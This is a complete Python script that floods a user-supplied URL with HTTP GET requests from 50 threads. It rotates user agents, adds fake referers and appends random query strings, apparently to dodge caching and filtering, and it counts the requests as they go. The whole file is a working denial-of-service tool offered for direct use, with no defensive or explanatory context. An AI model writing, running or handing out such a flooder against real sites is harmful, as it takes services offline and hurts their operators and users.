import requests, threading, random, sys, time, signal

url = sys.argv[1] if len(sys.argv) > 1 else input("Target URL: ").strip()
if not url.startswith("http"):
    print("Add http:// or https://"); sys.exit(1)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; rv:97.0) Gecko/20100101 Firefox/97.0",
]
REFERERS = ["https://google.com/", "https://facebook.com/", "https://duckduckgo.com/"]

sent = 0
lock = threading.Lock()
running = True

def flood():
    global sent
    while running:
        try:
            h = {"User-Agent": random.choice(USER_AGENTS), "Referer": random.choice(REFERERS)}
            p = f"?{random.randint(100,999)}"
            requests.get(url + p, headers=h, timeout=5)
            with lock: sent += 1
        except requests.ConnectionError:
            pass

def handler(sig, frame):
    global running
    running = False

signal.signal(signal.SIGINT, handler)
print(f"Flooding {url} — Ctrl+C to stop")
print("=" * 40)
for _ in range(50):
    threading.Thread(target=flood, daemon=True).start()
try:
    while running:
        print(f"Requests sent: {sent}", end="\r")
        time.sleep(0.5)
except KeyboardInterrupt:
    pass
print(f"\nDone. Total requests: {sent}")
